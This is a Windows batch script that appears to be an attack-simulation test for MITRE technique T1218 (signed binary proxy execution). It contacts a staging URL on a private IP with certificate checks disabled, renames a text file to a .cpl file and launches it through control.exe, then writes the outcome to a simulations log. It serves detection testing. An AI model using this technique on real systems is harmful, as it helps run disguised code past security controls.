@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7583-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=potoshop.txt
SET rgnpbq=7583

REM Derived variables with random names
SET tmznqa=!APPDATA!\!fkesh!
SET hkcvy=!tmznqa!\macula-simulations.log
SET omrsz=Control.exe
SET wstkv=T1218|Signed Binary Proxy Execution
SET hqfpj=1
SET kdmgx=

REM Step 1: Check server availability (heartbeat)
curl -k -s -o nul "!frytcn!"
IF NOT !ERRORLEVEL! EQU 0 (
  SET hqfpj=0
  SET kdmgx=server_unreachable
  GOTO ztjmp
)

REM Step 3: Rename file to file.cpl
IF NOT EXIST "!douyiw!\!ecrfwq!" (
  SET hqfpj=0
  SET kdmgx=source_not_found
  GOTO ztjmp
)

REN "!douyiw!\!ecrfwq!" file.cpl
IF NOT !ERRORLEVEL! EQU 0 (
  SET hqfpj=0
  SET kdmgx=rename_failed
  GOTO ztjmp
)

REM Step 4: Execute the CPL file via control.exe
IF NOT EXIST "!douyiw!\file.cpl" (
  SET hqfpj=0
  SET kdmgx=cpl_not_found
  GOTO ztjmp
)

%windir%\System32\!omrsz! "!douyiw!\file.cpl"
IF NOT !ERRORLEVEL! EQU 0 (
  SET hqfpj=0
  SET kdmgx=execution_failed
)

:ztjmp
FOR /f "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET vxdtr=%%I
SET qklbn=!vxdtr:~0,4!-!vxdtr:~4,2!-!vxdtr:~6,2! !vxdtr:~8,2!:!vxdtr:~10,2!:!vxdtr:~12,2!.!vxdtr:~15,3!
ECHO [!qklbn!][!eykalkg!]: !fkesh!-!rgnpbq!-!wstkv!=!hqfpj!:!kdmgx! >> "!hkcvy!" 2>nul
ENDLOCAL